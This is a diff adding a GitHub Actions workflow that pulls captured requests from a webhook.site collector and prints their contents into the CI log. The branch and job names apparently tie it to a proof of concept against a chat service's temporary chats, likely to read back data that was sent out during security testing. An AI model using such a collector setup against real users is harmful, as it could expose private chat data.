@@ -1,0 +1,36 @@
+name: TEMP v0.61 Temporary Chat collector readback
+
+on:
+  push:
+    branches:
+      - project/chatgpt-webview-poc
+    paths:
+      - .github/workflows/tmp-v061-temporary-chat-readback.yml
+
+permissions:
+  contents: read
+
+jobs:
+  readback:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Fetch and summarize v0.61 collector
+        env:
+          READ_URL: https://webhook.site/token/d40fc696-e90e-4545-8af5-729396437dad/requests?sorting=oldest&per_page=100
+        run: |
+          python3 - <<'PY'
+          import json, os, urllib.request
+          with urllib.request.urlopen(os.environ['READ_URL'], timeout=30) as r:
+              root=json.load(r)
+          rows=root.get('data', [])
+          print('COLLECTOR_TOTAL', root.get('total', len(rows)))
+          for i,row in enumerate(rows,1):
+              print('=== REQUEST', i, '===')
+              print('CREATED_AT', row.get('created_at','-'))
+              content=row.get('content','')
+              try:
+                  obj=json.loads(content)
+                  print(json.dumps(obj, sort_keys=True, separators=(',',':')))
+              except Exception:
+                  print(content)
+          PY
